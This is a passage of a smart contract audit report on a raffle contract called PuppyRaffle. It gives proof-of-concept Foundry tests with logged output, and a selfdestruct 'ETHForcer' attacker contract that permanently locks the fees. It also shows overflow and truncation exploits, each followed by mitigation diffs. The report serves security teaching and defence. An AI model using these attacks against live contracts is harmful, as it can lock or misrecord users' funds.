+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true" tabindex="-1"></a>        <span class="co">// after a normal draw the contract holds exactly the recorded fees,</span></span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true" tabindex="-1"></a>        <span class="co">// which is the only state where withdrawFees is allowed to run</span></span>
+<span id="cb18-15"><a href="#cb18-15" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;totalFees recorded:&quot;</span><span class="op">,</span> <span class="fu">uint256</span>(puppyRaffle<span class="op">.</span><span class="fu">totalFees</span>()))<span class="op">;</span></span>
+<span id="cb18-16"><a href="#cb18-16" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;raffle balance:&quot;</span><span class="op">,</span> <span class="fu">address</span>(puppyRaffle)<span class="op">.</span><span class="at">balance</span>)<span class="op">;</span></span>
+<span id="cb18-17"><a href="#cb18-17" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertEq</span>(</span>
+<span id="cb18-18"><a href="#cb18-18" aria-hidden="true" tabindex="-1"></a>            <span class="fu">address</span>(puppyRaffle)<span class="op">.</span><span class="at">balance</span><span class="op">,</span></span>
+<span id="cb18-19"><a href="#cb18-19" aria-hidden="true" tabindex="-1"></a>            <span class="fu">uint256</span>(puppyRaffle<span class="op">.</span><span class="fu">totalFees</span>())</span>
+<span id="cb18-20"><a href="#cb18-20" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb18-21"><a href="#cb18-21" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-22"><a href="#cb18-22" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the contract has no receive or fallback, so the only way ETH gets in</span></span>
+<span id="cb18-23"><a href="#cb18-23" aria-hidden="true" tabindex="-1"></a>        <span class="co">// is by force feeding it with selfdestruct</span></span>
+<span id="cb18-24"><a href="#cb18-24" aria-hidden="true" tabindex="-1"></a>        ETHForcer forcer <span class="op">=</span> <span class="kw">new</span> ETHForcer{<span class="dt">value</span><span class="op">:</span> <span class="dv">1</span> ether}()<span class="op">;</span></span>
+<span id="cb18-25"><a href="#cb18-25" aria-hidden="true" tabindex="-1"></a>        forcer<span class="op">.</span><span class="fu">attack</span>(<span class="fu">payable</span>(<span class="fu">address</span>(puppyRaffle)))<span class="op">;</span></span>
+<span id="cb18-26"><a href="#cb18-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-27"><a href="#cb18-27" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb18-28"><a href="#cb18-28" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;raffle balance after force feed:&quot;</span><span class="op">,</span></span>
+<span id="cb18-29"><a href="#cb18-29" aria-hidden="true" tabindex="-1"></a>            <span class="fu">address</span>(puppyRaffle)<span class="op">.</span><span class="at">balance</span></span>
+<span id="cb18-30"><a href="#cb18-30" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb18-31"><a href="#cb18-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-32"><a href="#cb18-32" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the equality can never hold again, so the fees are stuck forever</span></span>
+<span id="cb18-33"><a href="#cb18-33" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">expectRevert</span>(<span class="st">&quot;PuppyRaffle: There are currently players active!&quot;</span>)<span class="op">;</span></span>
+<span id="cb18-34"><a href="#cb18-34" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">withdrawFees</span>()<span class="op">;</span></span>
+<span id="cb18-35"><a href="#cb18-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb18-36"><a href="#cb18-36" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertGt</span>(</span>
+<span id="cb18-37"><a href="#cb18-37" aria-hidden="true" tabindex="-1"></a>            <span class="fu">address</span>(puppyRaffle)<span class="op">.</span><span class="at">balance</span><span class="op">,</span></span>
+<span id="cb18-38"><a href="#cb18-38" aria-hidden="true" tabindex="-1"></a>            <span class="fu">uint256</span>(puppyRaffle<span class="op">.</span><span class="fu">totalFees</span>())</span>
+<span id="cb18-39"><a href="#cb18-39" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb18-40"><a href="#cb18-40" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;feeAddress balance:&quot;</span><span class="op">,</span> <span class="fu">address</span>(feeAddress)<span class="op">.</span><span class="at">balance</span>)<span class="op">;</span></span>
+<span id="cb18-41"><a href="#cb18-41" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertEq</span>(<span class="fu">address</span>(feeAddress)<span class="op">.</span><span class="at">balance</span><span class="op">,</span> <span class="dv">0</span>)<span class="op">;</span></span>
+<span id="cb18-42"><a href="#cb18-42" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div></div>
+</details>
+<p>The attacker contract:</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb19"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true" tabindex="-1"></a>contract ETHForcer {</span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true" tabindex="-1"></a>    <span class="fu">constructor</span>() payable {}</span>
+<span id="cb19-3"><a href="#cb19-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb19-4"><a href="#cb19-4" aria-hidden="true" tabindex="-1"></a>    <span class="co">// selfdestruct pushes the whole balance into the target, and the target</span></span>
+<span id="cb19-5"><a href="#cb19-5" aria-hidden="true" tabindex="-1"></a>    <span class="co">// cannot refuse it, even without a receive or fallback function</span></span>
+<span id="cb19-6"><a href="#cb19-6" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">attack</span>(address payable target) external {</span>
+<span id="cb19-7"><a href="#cb19-7" aria-hidden="true" tabindex="-1"></a>        <span class="fu">selfdestruct</span>(target)<span class="op">;</span></span>
+<span id="cb19-8"><a href="#cb19-8" aria-hidden="true" tabindex="-1"></a>    }</span>
+<span id="cb19-9"><a href="#cb19-9" aria-hidden="true" tabindex="-1"></a>}</span></code></pre></div></div>
+</details>
+<p>You can run it via</p>
+<div class="sourceCode" id="cb20"><div class="codehilite"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--mt</span> test_MishandlingOfETH_AUDIT <span class="at">-vvv</span></span></code></pre></div></div>
+<p>and you will see something like this:</p>
+<pre class="text"><code>Logs:
+  totalFees recorded: 800000000000000000
+  raffle balance: 800000000000000000
+  raffle balance after force feed: 1800000000000000000
+  feeAddress balance: 0</code></pre>
+<p>The raffle starts out holding exactly the fees it owes, one selfdestruct pushes the balance above <code>totalFees</code>, and from then on <code>withdrawFees</code> reverts even though no players are active.</p>
+<p><strong>Recommended Mitigation:</strong> 1. Use a <code>&gt;=</code> check instead of <code>==</code>, since the contract only needs to hold <em>at least</em> the fees it owes:</p>
+<div class="sourceCode" id="cb22"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true" tabindex="-1"></a><span class="st">-        address(this).balance == uint256(totalFees),</span></span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true" tabindex="-1"></a><span class="va">+        address(this).balance &gt;= uint256(totalFees),</span></span></code></pre></div></div>
+<ol start="2" type="1">
+<li>Never use the contract balance for accounting, since ETH can always be forced in. Track the players’ funds in their own variable and check that instead:</li>
+</ol>
+<div class="sourceCode" id="cb23"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true" tabindex="-1"></a><span class="va">+    uint256 public playerFunds;</span></span>
+<span id="cb23-2"><a href="#cb23-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-3"><a href="#cb23-3" aria-hidden="true" tabindex="-1"></a>     // enterRaffle</span>
+<span id="cb23-4"><a href="#cb23-4" aria-hidden="true" tabindex="-1"></a><span class="va">+    playerFunds += msg.value;</span></span>
+<span id="cb23-5"><a href="#cb23-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-6"><a href="#cb23-6" aria-hidden="true" tabindex="-1"></a>     // refund, when a player takes their fee back</span>
+<span id="cb23-7"><a href="#cb23-7" aria-hidden="true" tabindex="-1"></a><span class="va">+    playerFunds -= entranceFee;</span></span>
+<span id="cb23-8"><a href="#cb23-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-9"><a href="#cb23-9" aria-hidden="true" tabindex="-1"></a>     // selectWinner, after the prize and the fee are accounted for</span>
+<span id="cb23-10"><a href="#cb23-10" aria-hidden="true" tabindex="-1"></a><span class="va">+    playerFunds = 0;</span></span>
+<span id="cb23-11"><a href="#cb23-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb23-12"><a href="#cb23-12" aria-hidden="true" tabindex="-1"></a>     // withdrawFees</span>
+<span id="cb23-13"><a href="#cb23-13" aria-hidden="true" tabindex="-1"></a><span class="st">-        address(this).balance == uint256(totalFees),</span></span>
+<span id="cb23-14"><a href="#cb23-14" aria-hidden="true" tabindex="-1"></a><span class="va">+        playerFunds == 0,</span></span></code></pre></div></div>
+<hr />
+<h1 id="medium">Medium</h1>
+<h3 id="m-1-arithmetic-overflow-in-puppyraffleselectwinner-totalfees-wraps-around-because-the-contract-runs-solidity-076">[M-1] Arithmetic overflow in <code>PuppyRaffle::selectWinner</code>, <code>totalFees</code> wraps around because the contract runs Solidity 0.7.6</h3>
+<p><strong>Description:</strong> The line <code>totalFees = totalFees + uint64(fee);</code> runs on Solidity <code>0.7.6</code>, where arithmetic overflow does <strong>not</strong> revert. It silently wraps around. As soon as the running total passes the maximum value of <code>uint64</code> (<code>18,446,744,073,709,551,615</code>), <code>totalFees</code> rolls back down instead of continuing to grow, and every fee recorded after that point is wrong.</p>
+<p><strong>Impact:</strong> The fee record can lead to overflow.</p>
+<p><strong>Proof of Concept:</strong> Check the <code>test_ArithmeticOverflow_AUDIT</code> test in the <code>PuppyRaffleTest.t.sol</code> file:</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb24"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">test_ArithmeticOverflow_AUDIT</span>() <span class="kw">public</span> {</span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true" tabindex="-1"></a>        <span class="co">// a separate raffle with a big entrance fee, so totalFees gets close to uint64 max</span></span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true" tabindex="-1"></a>        uint256 bigEntranceFee <span class="op">=</span> <span class="fl">1.5e19</span><span class="op">;</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true" tabindex="-1"></a>        PuppyRaffle bigRaffle <span class="op">=</span> <span class="kw">new</span> <span class="fu">PuppyRaffle</span>(</span>
+<span id="cb24-5"><a href="#cb24-5" aria-hidden="true" tabindex="-1"></a>            bigEntranceFee<span class="op">,</span></span>
+<span id="cb24-6"><a href="#cb24-6" aria-hidden="true" tabindex="-1"></a>            feeAddress<span class="op">,</span></span>
+<span id="cb24-7"><a href="#cb24-7" aria-hidden="true" tabindex="-1"></a>            duration</span>
+<span id="cb24-8"><a href="#cb24-8" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb24-9"><a href="#cb24-9" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-10"><a href="#cb24-10" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](<span class="dv">4</span>)<span class="op">;</span></span>
+<span id="cb24-11"><a href="#cb24-11" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">0</span>] <span class="op">=</span> playerOne<span class="op">;</span></span>
+<span id="cb24-12"><a href="#cb24-12" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">1</span>] <span class="op">=</span> playerTwo<span class="op">;</span></span>
+<span id="cb24-13"><a href="#cb24-13" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">2</span>] <span class="op">=</span> playerThree<span class="op">;</span></span>
+<span id="cb24-14"><a href="#cb24-14" aria-hidden="true" tabindex="-1"></a>        players[<span class="dv">3</span>] <span class="op">=</span> playerFour<span class="op">;</span></span>
+<span id="cb24-15"><a href="#cb24-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-16"><a href="#cb24-16" aria-hidden="true" tabindex="-1"></a>        uint256 feePerRaffle <span class="op">=</span> (<span class="dv">4</span> <span class="op">*</span> bigEntranceFee <span class="op">*</span> <span class="dv">20</span>) <span class="op">/</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb24-17"><a href="#cb24-17" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-18"><a href="#cb24-18" aria-hidden="true" tabindex="-1"></a>        <span class="co">// raffle 1</span></span>
+<span id="cb24-19"><a href="#cb24-19" aria-hidden="true" tabindex="-1"></a>        bigRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> bigEntranceFee <span class="op">*</span> <span class="dv">4</span>}(players)<span class="op">;</span></span>
+<span id="cb24-20"><a href="#cb24-20" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">warp</span>(block<span class="op">.</span><span class="at">timestamp</span> <span class="op">+</span> duration <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb24-21"><a href="#cb24-21" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">roll</span>(block<span class="op">.</span><span class="at">number</span> <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb24-22"><a href="#cb24-22" aria-hidden="true" tabindex="-1"></a>        bigRaffle<span class="op">.</span><span class="fu">selectWinner</span>()<span class="op">;</span></span>
+<span id="cb24-23"><a href="#cb24-23" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb24-24"><a href="#cb24-24" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;totalFees after raffle 1:&quot;</span><span class="op">,</span></span>
+<span id="cb24-25"><a href="#cb24-25" aria-hidden="true" tabindex="-1"></a>            <span class="fu">uint256</span>(bigRaffle<span class="op">.</span><span class="fu">totalFees</span>())</span>
+<span id="cb24-26"><a href="#cb24-26" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb24-27"><a href="#cb24-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-28"><a href="#cb24-28" aria-hidden="true" tabindex="-1"></a>        <span class="co">// raffle 2</span></span>
+<span id="cb24-29"><a href="#cb24-29" aria-hidden="true" tabindex="-1"></a>        bigRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> bigEntranceFee <span class="op">*</span> <span class="dv">4</span>}(players)<span class="op">;</span></span>
+<span id="cb24-30"><a href="#cb24-30" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">warp</span>(block<span class="op">.</span><span class="at">timestamp</span> <span class="op">+</span> duration <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb24-31"><a href="#cb24-31" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">roll</span>(block<span class="op">.</span><span class="at">number</span> <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb24-32"><a href="#cb24-32" aria-hidden="true" tabindex="-1"></a>        bigRaffle<span class="op">.</span><span class="fu">selectWinner</span>()<span class="op">;</span></span>
+<span id="cb24-33"><a href="#cb24-33" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb24-34"><a href="#cb24-34" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;totalFees after raffle 2:&quot;</span><span class="op">,</span></span>
+<span id="cb24-35"><a href="#cb24-35" aria-hidden="true" tabindex="-1"></a>            <span class="fu">uint256</span>(bigRaffle<span class="op">.</span><span class="fu">totalFees</span>())</span>
+<span id="cb24-36"><a href="#cb24-36" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb24-37"><a href="#cb24-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-38"><a href="#cb24-38" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the two fees should add up, but uint64 wraps around instead</span></span>
+<span id="cb24-39"><a href="#cb24-39" aria-hidden="true" tabindex="-1"></a>        uint256 expectedWithoutOverflow <span class="op">=</span> feePerRaffle <span class="op">*</span> <span class="dv">2</span><span class="op">;</span></span>
+<span id="cb24-40"><a href="#cb24-40" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;expected without overflow:&quot;</span><span class="op">,</span> expectedWithoutOverflow)<span class="op">;</span></span>
+<span id="cb24-41"><a href="#cb24-41" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb24-42"><a href="#cb24-42" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertTrue</span>(expectedWithoutOverflow <span class="op">&gt;</span> <span class="fu">type</span>(uint64)<span class="op">.</span><span class="at">max</span>)<span class="op">;</span></span>
+<span id="cb24-43"><a href="#cb24-43" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertEq</span>(bigRaffle<span class="op">.</span><span class="fu">totalFees</span>()<span class="op">,</span> expectedWithoutOverflow <span class="op">-</span> <span class="dv">2</span><span class="op">**</span><span class="dv">64</span>)<span class="op">;</span></span>
+<span id="cb24-44"><a href="#cb24-44" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div></div>
+</details>
+<p>You can run it via</p>
+<div class="sourceCode" id="cb25"><div class="codehilite"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--mt</span> test_ArithmeticOverflow_AUDIT <span class="at">-vvv</span></span></code></pre></div></div>
+<p>and you will see something like this:</p>
+<pre class="text"><code>Logs:
+  totalFees after raffle 1: 12000000000000000000
+  totalFees after raffle 2: 5553255926290448384
+  expected without overflow: 24000000000000000000</code></pre>
+<p>Two fees of 12 ETH each should add up to 24 ETH, but <code>totalFees</code> records only about 5.55 ETH instead.</p>
+<p><strong>Recommended Mitigation:</strong> 1. Use OpenZeppelin’s <a href="https://docs.openzeppelin.com/contracts/3.x/api/math#SafeMath">SafeMath</a> for the addition, and widen <code>totalFees</code> to <code>uint256</code> so SafeMath can be applied cleanly:</p>
+<div class="sourceCode" id="cb27"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb27-1"><a href="#cb27-1" aria-hidden="true" tabindex="-1"></a><span class="va">+ import {SafeMath} from &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span></span>
+<span id="cb27-2"><a href="#cb27-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-3"><a href="#cb27-3" aria-hidden="true" tabindex="-1"></a>  contract PuppyRaffle is ERC721, Ownable {</span>
+<span id="cb27-4"><a href="#cb27-4" aria-hidden="true" tabindex="-1"></a><span class="va">+     using SafeMath for uint256;</span></span>
+<span id="cb27-5"><a href="#cb27-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-6"><a href="#cb27-6" aria-hidden="true" tabindex="-1"></a><span class="st">-     uint64 public totalFees = 0;</span></span>
+<span id="cb27-7"><a href="#cb27-7" aria-hidden="true" tabindex="-1"></a><span class="va">+     uint256 public totalFees = 0;</span></span>
+<span id="cb27-8"><a href="#cb27-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb27-9"><a href="#cb27-9" aria-hidden="true" tabindex="-1"></a><span class="st">-        totalFees = totalFees + uint64(fee);</span></span>
+<span id="cb27-10"><a href="#cb27-10" aria-hidden="true" tabindex="-1"></a><span class="va">+        totalFees = totalFees.add(fee);</span></span></code></pre></div></div>
+<ol start="2" type="1">
+<li>Better yet, upgrade to the <a href="https://docs.soliditylang.org/en/latest/">latest Solidity version</a>. From <code>0.8.0</code> onwards <code>+</code> reverts on overflow automatically, so SafeMath is not needed at all and this whole class of bug disappears.</li>
+</ol>
+<hr />
+<h3 id="m-2-unsafe-casting-of-uint256-down-to-uint64-in-puppyraffleselectwinner-the-recorded-fee-silently-loses-most-of-its-value">[M-2] Unsafe casting of <code>uint256</code> down to <code>uint64</code> in <code>PuppyRaffle::selectWinner</code>, the recorded fee silently loses most of its value</h3>
+<p><strong>Description:</strong> <code>totalFees = totalFees + uint64(fee);</code> casts a <code>uint256</code> <code>fee</code> down to <code>uint64</code>. Explicit narrowing casts in Solidity never revert, they simply cut off the higher-order bits. Since <code>fee</code> is 20% of everything collected, it crosses the <code>uint64</code> maximum (<code>18,446,744,073,709,551,615</code>, about 18.45 ETH) as soon as a single raffle collects more than roughly 92 ETH, and everything above that limit is silently dropped. Worth noting this still happens on Solidity <code>0.8+</code>, because the built-in overflow checks only cover arithmetic (<code>+</code>, <code>-</code>, <code>*</code>), not type conversions.</p>
+<p><strong>Impact:</strong> <code>totalFees</code> records only a fraction of the real fee.</p>
+<p><strong>Proof of Concept:</strong> Check the <code>test_UnsafeCasting_AUDIT</code> test in the <code>PuppyRaffleTest.t.sol</code> file:</p>
+<details open>
+<summary>
+Here’s the full code
+</summary>
+<div class="sourceCode" id="cb28"><div class="codehilite"><pre class="sourceCode javascript"><code class="sourceCode javascript"><span id="cb28-1"><a href="#cb28-1" aria-hidden="true" tabindex="-1"></a>    <span class="kw">function</span> <span class="fu">test_UnsafeCasting_AUDIT</span>() <span class="kw">public</span> {</span>
+<span id="cb28-2"><a href="#cb28-2" aria-hidden="true" tabindex="-1"></a>        uint256 playersNum <span class="op">=</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb28-3"><a href="#cb28-3" aria-hidden="true" tabindex="-1"></a>        address[] memory players <span class="op">=</span> <span class="kw">new</span> address[](playersNum)<span class="op">;</span></span>
+<span id="cb28-4"><a href="#cb28-4" aria-hidden="true" tabindex="-1"></a>        <span class="cf">for</span> (uint256 i <span class="op">=</span> <span class="dv">0</span><span class="op">;</span> i <span class="op">&lt;</span> playersNum<span class="op">;</span> i<span class="op">++</span>) {</span>
+<span id="cb28-5"><a href="#cb28-5" aria-hidden="true" tabindex="-1"></a>            players[i] <span class="op">=</span> <span class="fu">address</span>(i <span class="op">+</span> <span class="dv">100</span>)<span class="op">;</span></span>
+<span id="cb28-6"><a href="#cb28-6" aria-hidden="true" tabindex="-1"></a>        }</span>
+<span id="cb28-7"><a href="#cb28-7" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="at">enterRaffle</span>{<span class="dt">value</span><span class="op">:</span> entranceFee <span class="op">*</span> playersNum}(players)<span class="op">;</span></span>
+<span id="cb28-8"><a href="#cb28-8" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-9"><a href="#cb28-9" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">warp</span>(block<span class="op">.</span><span class="at">timestamp</span> <span class="op">+</span> duration <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb28-10"><a href="#cb28-10" aria-hidden="true" tabindex="-1"></a>        vm<span class="op">.</span><span class="fu">roll</span>(block<span class="op">.</span><span class="at">number</span> <span class="op">+</span> <span class="dv">1</span>)<span class="op">;</span></span>
+<span id="cb28-11"><a href="#cb28-11" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-12"><a href="#cb28-12" aria-hidden="true" tabindex="-1"></a>        uint256 expectedFee <span class="op">=</span> (playersNum <span class="op">*</span> entranceFee <span class="op">*</span> <span class="dv">20</span>) <span class="op">/</span> <span class="dv">100</span><span class="op">;</span></span>
+<span id="cb28-13"><a href="#cb28-13" aria-hidden="true" tabindex="-1"></a>        uint256 truncatedFee <span class="op">=</span> <span class="fu">uint256</span>(<span class="fu">uint64</span>(expectedFee))<span class="op">;</span></span>
+<span id="cb28-14"><a href="#cb28-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-15"><a href="#cb28-15" aria-hidden="true" tabindex="-1"></a>        puppyRaffle<span class="op">.</span><span class="fu">selectWinner</span>()<span class="op">;</span></span>
+<span id="cb28-16"><a href="#cb28-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-17"><a href="#cb28-17" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(<span class="st">&quot;expected fee:&quot;</span><span class="op">,</span> expectedFee)<span class="op">;</span></span>
+<span id="cb28-18"><a href="#cb28-18" aria-hidden="true" tabindex="-1"></a>        console2<span class="op">.</span><span class="fu">log</span>(</span>
+<span id="cb28-19"><a href="#cb28-19" aria-hidden="true" tabindex="-1"></a>            <span class="st">&quot;totalFees actually recorded:&quot;</span><span class="op">,</span></span>
+<span id="cb28-20"><a href="#cb28-20" aria-hidden="true" tabindex="-1"></a>            <span class="fu">uint256</span>(puppyRaffle<span class="op">.</span><span class="fu">totalFees</span>())</span>
+<span id="cb28-21"><a href="#cb28-21" aria-hidden="true" tabindex="-1"></a>        )<span class="op">;</span></span>
+<span id="cb28-22"><a href="#cb28-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb28-23"><a href="#cb28-23" aria-hidden="true" tabindex="-1"></a>        <span class="co">// the fee is bigger than uint64 max, so the cast silently truncates it</span></span>
+<span id="cb28-24"><a href="#cb28-24" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertTrue</span>(expectedFee <span class="op">&gt;</span> <span class="fu">type</span>(uint64)<span class="op">.</span><span class="at">max</span>)<span class="op">;</span></span>
+<span id="cb28-25"><a href="#cb28-25" aria-hidden="true" tabindex="-1"></a>        <span class="fu">assertEq</span>(<span class="fu">uint256</span>(puppyRaffle<span class="op">.</span><span class="fu">totalFees</span>())<span class="op">,</span> truncatedFee)<span class="op">;</span></span>
+<span id="cb28-26"><a href="#cb28-26" aria-hidden="true" tabindex="-1"></a>    }</span></code></pre></div></div>
+</details>
+<p>You can run it via</p>
+<div class="sourceCode" id="cb29"><div class="codehilite"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb29-1"><a href="#cb29-1" aria-hidden="true" tabindex="-1"></a><span class="ex">forge</span> test <span class="at">--mt</span> test_UnsafeCasting_AUDIT <span class="at">-vvv</span></span></code></pre></div></div>
+<p>and you will see something like this:</p>
+<pre class="text"><code>Logs:
+  expected fee: 20000000000000000000
+  totalFees actually recorded: 1553255926290448384</code></pre>
+<p>A 20 ETH fee gets recorded as about 1.55 ETH, with no revert and no warning.</p>
+<p><strong>Recommended Mitigation:</strong> 1. Widen <code>totalFees</code> to <code>uint256</code>, so the cast disappears entirely and nothing can be truncated:</p>
+<div class="sourceCode" id="cb31"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="st">-     uint64 public totalFees = 0;</span></span>
+<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="va">+     uint256 public totalFees = 0;</span></span>
+<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a><span class="st">-        totalFees = totalFees + uint64(fee);</span></span>
+<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a><span class="va">+        totalFees = totalFees + fee;</span></span></code></pre></div></div>
+<ol start="2" type="1">
+<li>If <code>uint64</code> has to stay for packing reasons, use OpenZeppelin’s <a href="https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast">SafeCast</a> so the conversion reverts instead of silently truncating:</li>
+</ol>
+<div class="sourceCode" id="cb32"><div class="codehilite"><pre class="sourceCode diff"><code class="sourceCode diff"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="va">+ import {SafeCast} from &quot;@openzeppelin/contracts/utils/SafeCast.sol&quot;;</span></span>
+<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a>  contract PuppyRaffle is ERC721, Ownable {</span>
+<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a><span class="va">+     using SafeCast for uint256;</span></span>
+<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a><span class="st">-        totalFees = totalFees + uint64(fee);</span></span>
+<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a><span class="va">+        totalFees = totalFees + fee.toUint64();</span></span></code></pre></div></div>
+<p>Note that this turns silent corruption into a revert, so the raffle would stop working once the fee passes the limit. Widening the type is still the real fix.</p>
+<hr />
+<h1 id="low">Low</h1>
+<h3 id="l-1-loop-based-membership-check-in-puppyraffle_isactiveplayer-function-it-should-use-a-mapping-instead-of-iterating-the-array">[L-1] Loop based membership check in <code>PuppyRaffle::_isActivePlayer</code> function, it should use a mapping instead of iterating the array</h3>
